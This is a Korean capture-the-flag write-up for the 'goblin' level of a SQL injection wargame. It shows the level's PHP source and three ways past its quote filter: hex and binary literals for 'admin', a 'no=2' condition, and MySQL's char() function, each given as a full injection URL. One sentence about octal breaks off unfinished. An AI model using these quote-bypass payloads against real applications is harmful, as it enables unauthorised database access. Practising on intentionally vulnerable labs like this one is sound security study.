# 3번문제 goblin

이번에는 서버가 어려워졌다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```
이제 '와 "을 sql문에서 입력할 수 없게 막은 것인데,  
그래서 id='admin' 과 같이 파라미터를 보낼 수 없게됬다.

## 방법 1. id에 다른 진수를 사용하기

여기서 쓸 수 있는 것은, 스트링 우회법이다.  
db마다 다른데, 여기선 0x로 문자들을 16진수로 표기해도 문자열로 해석하는 점을 이용해서,

admin 을 0x61646d696e 으로 입력해준다.
(16진수로 텍스트를 변환하는 것은 https://www.online-toolz.com/langs/ko/tool-ko-text-hex-convertor.html 이 사이트를 이용했다.)

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20id=0x61646d696e
query : select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
```
이렇게 해주면 뚫리는 것을 볼 수 있다.

마찬가지로 2진수로 표기해도 문자열로 해석된다.
```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20id=0b0110000101100100011011010110100101101110
query : select id from prob_goblin where id='guest' and no=0 or id=0b0110000101100100011011010110100101101110
```

대신에 8진수는 

# 방법 2. no 값 넣기

아까 no=1 일때, guest가 true 가 됬으니, no값을 조작해서 id가 admin 이 나오게 하면 된다.
```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20no=2
query : select id from prob_goblin where id='guest' and no=0 or no=2
```

# 방법 3. id에 char() 내장 함수 사용하기

16진수로 값을 변환해서 넣지 않아도, mysql에선 char라는 내장함수로 10진수를 아스키코드로 변환하는 것을 활용할 수 있다.
```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20id=char(97,%20100,%20109,%20105,%20110)
query : select id from prob_goblin where id='guest' and no=0 or id=char(97, 100, 109, 105, 110)
```
